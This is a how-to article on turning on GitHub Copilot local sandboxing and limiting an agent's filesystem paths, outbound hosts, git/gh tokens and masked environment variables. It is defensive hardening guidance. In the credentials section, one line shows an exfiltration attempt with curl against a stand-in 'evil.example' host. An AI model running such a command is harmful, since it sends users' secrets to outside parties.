---
title: "How to Turn On Copilot Local Sandboxing and Restrict Which Directories, Hosts, and Credentials an Agent Can Touch"
description: "Enable GitHub Copilot local sandboxing in Copilot CLI 1.0.95 and the Copilot app, then lock down filesystem paths, outbound hosts, git/gh tokens and masked environment variables. Covers the settings.json keys, /sandbox policy, the bypass escape hatch, enterprise enforcement, and the gotchas on macOS, Linux and Windows."
pubDate: 2026-10-12
template: how-to
tags:
  - "github-copilot"
  - "ai-agents"
  - "copilot-cli"
  - "sandboxing"
  - "security"
---

**Short answer:** run `/sandbox enable` inside a Copilot CLI session (or start one with `copilot --sandbox`) and every shell command, `grep`/`glob` call, local MCP server and LSP server Copilot spawns runs inside an OS-level sandbox. By default it can write only to the working directory, `.git` and temp, read the rest of the repo plus your dev tools, reach the internet but not your local network, and use git and `gh` only through a proxy that hands it fake tokens. You narrow that further in `/sandbox` (four tabs: General, Credentials, Filesystem, Network) or in `~/.copilot/settings.json` under the `sandbox` key, and you check the result with `/sandbox policy <command>` before trusting it. In the Copilot app the switch is `/sandbox on` per session, or **Settings > Projects > [project] > Sandbox > Sandbox new sessions** per project. Everything below was checked against Copilot CLI 1.0.95 and the docs as of October 12, 2026. Local sandboxing [went generally available on October 7, 2026](https://github.blog/changelog/2026-10-07-local-sandboxing-for-gitHub-copilot-now-generally-available) for the CLI, the Copilot app, and VS Code sessions that use Agent Host.

## What the sandbox actually changes

Without the sandbox, an approved `npm install` runs with your full user account: it can read `~/.ssh`, `~/.aws/credentials`, every other repository on disk, and reach any host your laptop can. The prompt approved the command line, not what a malicious `postinstall` script does at runtime.

Local sandboxing moves the boundary from "did a human approve this string" to "what is this process allowed to touch". It is built on [Microsoft eXecution Container (MXC)](https://github.com/microsoft/mxc), which takes one policy and maps it to each OS's native isolation:

- **macOS**: the Seatbelt backend (`sandbox-exec`). Nothing to install.
- **Linux**: bubblewrap. You need `bwrap` 0.5.0 or later and `slirp4netns` on `PATH`. `copilot help sandbox` also lists util-linux 2.35+ (`unshare` with `--map-current-user` and `--keep-caps`, plus `nsenter`), `iptables`/`ip6tables` with their `-restore` binaries, and read/write access to `/dev/net/tun`, because every sandbox gets a private network namespace.
- **Windows**: MXC ProcessContainer with the BaseContainer tier. The docs require Windows 11 25H2 with KB5124010 or later, or 26H1 with KB5124006 or later.

Two things are worth knowing before you rely on it. First, the built-in file read and edit tools run inside the Copilot process, so the policy is checked in software only, with no OS backstop. Shell commands, `grep`, `glob` (ripgrep runs as a child process) and sandboxed MCP/LSP servers get real OS enforcement. Second, remote (HTTP/SSE) MCP servers are never sandboxed. The sandbox constrains processes on your machine, not services on someone else's.

Compared with [running a coding agent in a disposable VM or container](/2026/09/run-coding-agents-in-disposable-vms-and-containers/), this is the lighter option: you keep your local toolchain, and the agent's commands get a fence instead of a separate machine.

## Turn it on in Copilot CLI

Install or update the CLI, then check the host can sandbox at all:

```bash
# Copilot CLI 1.0.95, October 2026
npm install -g @github/copilot@latest
copilot --version

# Prints how sandboxing works on this OS and which prerequisites it probes for
copilot help sandbox
```

Now pick how sticky you want it to be:

```bash
# One session only
copilot --sandbox

# Headless / programmatic run, sandboxed
copilot --sandbox -p "run the test suite and fix the first failure"

# Force it off for one session (refused if your org requires sandboxing)
copilot --no-sandbox
```

Inside an interactive session, `/sandbox enable` turns it on and writes `"sandbox": { "enabled": true }` to `~/.copilot/settings.json`, so every new session starts sandboxed. Sessions that were already open keep their old state until you run `/sandbox enable` in them or restart them (`copilot --continue` restarts the last one). The status line shows `sandbox enabled` while it is active, and `/sandbox status` answers the same question explicitly.

One trap on Linux: if `sandbox.enabled` is `true` and a prerequisite is missing, Copilot does not fall back to running unsandboxed. Every shell command and sandboxed MCP/LSP server fails, with a startup warning. On a fresh CI image that looks like "Copilot is broken". Install the packages or run `/sandbox disable`.

## Read the default policy before you change it

Do not guess what the sandbox allows. Ask it:

```text
/sandbox policy
/sandbox policy npm install
/sandbox policy dotnet test
```

The first form prints the effective paths, network settings and capabilities for the current directory. The second previews what a specific command would get without running it and without creating any directories. Use it every time you change a rule.

With the defaults, in a Git repository, you get roughly this:

| Area | Default |
|---|---|
| Working directory | Read/write (`addCurrentWorkingDirectory`) |
| `.git` metadata | Read/write, so `git status`, `add`, `commit`, `diff` work |
| Rest of the repo above the cwd | Read-only |
| Temp directories | Read/write |
| `PATH` dirs, toolchains, package caches | Mostly read-only, a few caches read/write (`allowDevToolAccess`) |
| Home directory as a whole | Not granted |
| `/add-dir` directories | Not granted to the sandbox |
| Outbound internet | Allowed |
| Local network / localhost | Blocked |
| git and `gh` auth | Via the masking proxy, fake tokens in the child |
| Bypass for a single blocked command | Allowed, with a prompt |

That `/add-dir` line catches people. Adding a directory to the agent's context does not grant sandboxed commands access to it. If the agent needs to run a build in a sibling repository, grant the path in the Filesystem tab too.

`allowDevToolAccess` is the broadest default. It grants read access to toolchains and registry config such as `~/.npmrc` and `~/.m2/settings.xml`, and read/write to shared build caches, scoped per command to the ecosystems it invokes. `~/.ssh` stays excluded, but a sandboxed command can read any registry token in your `.npmrc`. If that is not acceptable, turn it off and grant build paths yourself.

## Restrict which directories commands can touch

Open `/sandbox`, Tab over to **Filesystem**, select **User-configured paths**, press Enter, then `A` to add a rule. Each rule is one absolute path with one of three permissions: **Read/Write**, **Read-Only**, or **Denied**. Directories cover their whole subtree. Wildcards are not supported.

The precedence rules are short:

1. Deny beats every grant.
2. Between overlapping read-only and read/write grants, the more specific path wins.
3. Paths discovered automatically for dev tools yield to your own read/write coverage, but your rules are never removed because a tool grant covered the same path.

A typical hardening for a monorepo where the agent should work in one service and never see secrets:

```jsonc
// ~/.copilot/settings.json, Copilot CLI 1.0.95
{
  "sandbox": {
    "enabled": true,
    "addCurrentWorkingDirectory": true,
    "allowDevToolAccess": true,
    "userPolicy": {
      "filesystem": {
        "readwritePaths": ["/Users/marius/src/shop/services/orders"],
        "readonlyPaths": ["/Users/marius/src/shop/libs"],
        "deniedPaths": [
          "/Users/marius/src/shop/.env",
          "/Users/marius/src/shop/deploy/secrets",
          "/Users/marius/.aws",
          "/Users/marius/.kube"
        ]
      }
    }
  }
}
```

The key names come from `copilot help sandbox`. Add one rule through the dialog first and look at what it wrote to `settings.json` before templating it for a team.

Two filesystem gotchas that are easy to miss:

- **Denied paths that do not exist get created as directories.** Before a sandboxed command starts, Copilot creates every missing denied path and its parents so the OS has something to block. Deny `.env` in a repo that has no `.env` yet, and you get an empty directory called `.env` that stays there after the command exits. Your app's config loader may then choke on it. Create the real files first, or deny the parent directory.
- **Symlinks are not followed for you.** Adding a symlink through the dialog also grants its current target. Handwritten rules in `settings.json` do not. On Linux, denying a symlink protects the target but may not stop the link itself from being replaced, so deny the real directory.

If Copilot reports `Failed to prepare denied sandbox path`, the command never started. That is a policy problem, not a build failure.

Also note that unticking **Include working directory** removes `.git` access too, so every git command breaks. If you want the agent read-only in the repo, keep the working directory and deny the subpaths you care about instead.

## Restrict which hosts commands can reach

The **Network** tab has two switches and a rule list:

- **Allow outbound connections** (on by default). Turning it off also disables the proxy and every host rule.
- **Allow local network** (off by default). Controls `localhost` and private-network access.
- **Proxy and blocking > Host rules**: press `a`, enter a host, choose Allow or Deny. New rules default to Deny.

The same switches are `userPolicy.network.allowOutbound` and `userPolicy.network.allowLocalNetwork` in `settings.json`. A host rule accepts a hostname, a wildcard subdomain like `*.npmjs.org`, a bare `*`, or a single IPv4/IPv6 address. CIDR ranges, schemes, paths and ports are rejected.

The semantics are what turn this into an allowlist:

- A denied domain also denies all its subdomains.
- Deny beats Allow.
- **As soon as one Allow rule exists, every unmatched host is blocked.** The only exception is `localhost`, `127.0.0.1` and `::1`, which stay reachable when both outbound and local network are on.

So a Node build agent might get exactly `registry.npmjs.org`, `github.com`, `api.github.com`, `codeload.github.com` and `objects.githubusercontent.com`. Everything else, including wherever a compromised dependency wants to exfiltrate to, fails to connect. Run a real `npm ci` to find the hosts you missed. The per-ecosystem host lists from [locking down a coding agent's network egress with a strict host allowlist](/2026/07/how-to-lock-down-a-coding-agents-network-egress-with-a-strict-host-allowlist/) apply unchanged.

Local network behaves differently per OS. On macOS, turning it on lets a sandboxed command hit your dev server on `localhost:5173`. On Linux, sandboxed processes cannot reach the host's localhost directly at all (they live in their own network namespace); only the built-in proxy can, subject to host rules. On Windows it permits private-network access, and host localhost needs a supported build. On Windows you also need **Allow local network** on whenever you use git/`gh` auth or masked variables, or sandboxed commands cannot reach Copilot's own local proxy.

## Restrict which credentials commands can use

This is the part of the feature I like most, because it handles the case allowlists cannot: the agent needs to call an API that is allowed, but should never hold the real key.

On the **Credentials** tab, **Authenticate git** and **Authenticate gh** are on by default. Sandboxed git and `gh` get placeholder credentials, and a proxy in the Copilot host process swaps the real token in on approved HTTPS requests only. `gh` tokens are only ever injected for `github.com`, `api.github.com` and `uploads.github.com`. Git auth keeps the original HTTPS host, port and repository path scope.

For any other secret, add it under **Masked environment variables**, or in `settings.json`:

```jsonc
// ~/.copilot/settings.json, Copilot CLI 1.0.95
{
  "sandbox": {
    "enabled": true,
    "credentials": {
      "envVars": {
        "STRIPE_API_KEY": { "injectHosts": ["api.stripe.com"] },
        "SENTRY_AUTH_TOKEN": { "injectHosts": ["sentry.io", "*.sentry.io"] }
      }
    }
  }
}
```

You configure names and hosts, never values. The variable must be set and non-empty in the environment that launches Copilot. Before each sandboxed launch, Copilot replaces the value with a random per-launch sentinel. When the child sends an HTTPS request to an approved host with that sentinel in a header (`Authorization`, `X-Api-Key`, or the password of HTTP Basic auth), the proxy verifies the server certificate and substitutes the real value. Plain HTTP, URLs, request bodies and signed requests never get the real value. If the agent tries to `curl https://evil.example/?k=$STRIPE_API_KEY`, all it leaks is a random string that is useless outside this one launch.

The rules that bite:

- `*.sentry.io` matches subdomains only, not `sentry.io`. List both.
- An inject host is not a network grant. If you have Allow rules, `api.stripe.com` has to be allowed there as well.
- Do not also list a masked variable in `--secret-env-vars`. That flag strips the variable entirely, and masking needs it present.
- Anything you did not list is inherited as-is. The CLI's own help text is blunt about it: the sandbox inherits your shell environment apart from a fixed blocklist, so an `AWS_ACCESS_KEY_ID` exported in your shell is visible to sandboxed commands unless you mask it. Audit `env` before you start a sandboxed session.
- Tools that pin certificates, require HTTP/2, or use client certificates may fail through the proxy. Some tools also ignore the temporary CA bundle Copilot supplies. `/sandbox ca create` and `/sandbox ca trust` install the proxy's CA in the OS trust store (login Keychain on macOS, machine root store with an admin prompt on Windows; Linux uses the per-process bundle only). That changes trust for everything on the machine, so do it deliberately. After adding a new inject host, run `/sandbox ca rotate`.

This is a standalone [credential gateway that keeps API keys out of agent context](/2026/09/keep-api-keys-out-of-agent-context-with-a-credential-gateway/), built into the client.

On macOS, keychain access from inside the sandbox is off and can only be turned on by setting `sandbox.userPolicy.seatbelt.keychainAccess` to `true` in `settings.json`. Leave it off unless a specific tool cannot work without it.

## Decide what happens when a command is blocked

By default, when the sandbox blocks a command Copilot may offer to retry that one command outside the sandbox. In the Copilot app this shows up as **Run outside the sandbox?** with Cancel, a one-time run, and **More options > Disable sandbox and run** for the rest of the session.

An approved bypass skips the policy and the masking proxy, so the command runs with real secrets. Approve bypasses on reflex and you have rebuilt the permission prompt with extra steps. For unattended runs (`copilot --sandbox -p ...` in a scheduled job or CI), turn it off:

```jsonc
// ~/.copilot/settings.json, Copilot CLI 1.0.95
{
  "sandbox": {
    "enabled": true,
    "allowBypass": false,
    "sandboxMcpServers": true,
    "sandboxLspServers": true
  }
}
```

With `allowBypass: false`, blocked commands stay blocked and `/sandbox disable` is refused for the session. A headless run then fails loudly on a missing grant instead of quietly escaping, which is the behavior you want from something like a [Copilot CLI dynamic workflow running in CI](/2026/10/how-to-define-a-github-copilot-cli-dynamic-workflow-and-run-it-from-ci/).

Keep `sandboxMcpServers` on. A local stdio MCP server is just another process with your permissions, and it is the easiest place for a third-party package to hide something.

## Make it mandatory for a team

Personal settings are a suggestion. To enforce the sandbox, an enterprise or organization uses [enterprise managed settings](https://docs.github.com/en/copilot/reference/enterprise-administrators/enterprise-managed-settings), delivered by MDM, by a `copilot/managed-settings.json` file in the organization's `.github-private` repository, or as a local file. The `sandbox` key behaves differently from most managed keys: managed and user values combine in the most restrictive direction. Required toggles stay on, denied paths from every source accumulate, grantable paths and host rules can only be narrowed, and managed host rules show as `(managed)` and are read-only in the dialog.

A minimal managed baseline:

```jsonc
// copilot/managed-settings.json in .github-private
{
  "sandbox": {
    "enabled": true,
    "allowBypass": false,
    "sandboxMcpServers": true,
    "sandboxLspServers": true
  }
}
```

With that in place, `--no-sandbox` and a local `"enabled": false` are overridden. If the managed policy leaves `allowBypass` on, a developer can still run `/sandbox disable` for the current session, but the choice is not saved and the next session starts sandboxed again. If it sets `allowBypass: false`, a machine that cannot run the sandbox (missing `bwrap`, an old Windows build) cannot run shell commands at all, so roll out the prerequisites before the policy.

The Copilot app keeps its own sandbox settings, separate from the CLI, under **Settings > Projects**. Changes apply to new sessions or after `/restart-session`, and sandboxing does not apply to the app's cloud sandbox or remote-host sessions.

One Windows gotcha before you roll out: without the September 2026 update, sandboxed PowerShell can report `C:\` as its current directory, so `git status` runs against the wrong place. Use `git -C "C:\src\app" status` until you update.

## Related

- [How to lock down a coding agent's network egress with a strict host allowlist](/2026/07/how-to-lock-down-a-coding-agents-network-egress-with-a-strict-host-allowlist/)
- [How to keep API keys out of a coding agent's context with a credential gateway](/2026/09/keep-api-keys-out-of-agent-context-with-a-credential-gateway/)
- [How to run a coding agent in a disposable VM or container instead of on your laptop](/2026/09/run-coding-agents-in-disposable-vms-and-containers/)
- [How to keep Cursor agent tool execution inside your own network](/2026/09/how-to-keep-cursor-agent-tool-execution-inside-your-own-network/)
- [How to define a GitHub Copilot CLI dynamic workflow and run it from CI](/2026/10/how-to-define-a-github-copilot-cli-dynamic-workflow-and-run-it-from-ci/)

## Sources

- [Local sandboxing for GitHub Copilot now generally available](https://github.blog/changelog/2026-10-07-local-sandboxing-for-gitHub-copilot-now-generally-available) (GitHub changelog, October 7, 2026)
- [Using local sandboxing](https://docs.github.com/en/copilot/how-tos/cloud-and-local-sandboxes/using-local-sandboxing)
- [Configuring local sandbox settings](https://docs.github.com/en/copilot/how-tos/cloud-and-local-sandboxes/configuring-local-sandbox-settings)
- [Understanding filesystem policies for local sandboxing in Copilot CLI](https://docs.github.com/en/copilot/concepts/agents/copilot-cli/understanding-local-sandboxing)
- [Enterprise managed settings](https://docs.github.com/en/copilot/reference/enterprise-administrators/enterprise-managed-settings)
- [Microsoft eXecution Container (MXC)](https://github.com/microsoft/mxc)
- `copilot help sandbox`, Copilot CLI 1.0.95
